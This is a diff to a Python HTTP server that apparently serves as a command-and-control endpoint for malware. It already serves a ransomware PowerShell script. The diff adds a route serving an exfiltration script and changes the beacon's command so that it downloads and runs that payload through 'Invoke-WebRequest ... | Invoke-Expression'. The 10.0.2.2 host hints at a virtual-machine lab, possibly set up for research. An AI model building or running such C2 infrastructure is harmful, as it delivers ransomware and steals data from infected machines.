@@ -20,6 +20,9 @@ class CustomHandler(SimpleHTTPRequestHandler):
         if self.path == '/awesomeware':
             self.serve_file('../ransomware/ransom.ps1')
             return
+        if self.path == '/ratata':
+            self.serve_file('../exfil/squeak.ps1')
+            return
 
         log_data = ''
         # Get the current timestamp
@@ -35,7 +38,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
         self.end_headers()
 
         # Single command sent to C2 Beacon
-        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/awesomeware" | Invoke-Expression'''
+        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/ratata" | Invoke-Expression'''
         ###########################
 
         self.wfile.write(response_content.encode('utf-8'))
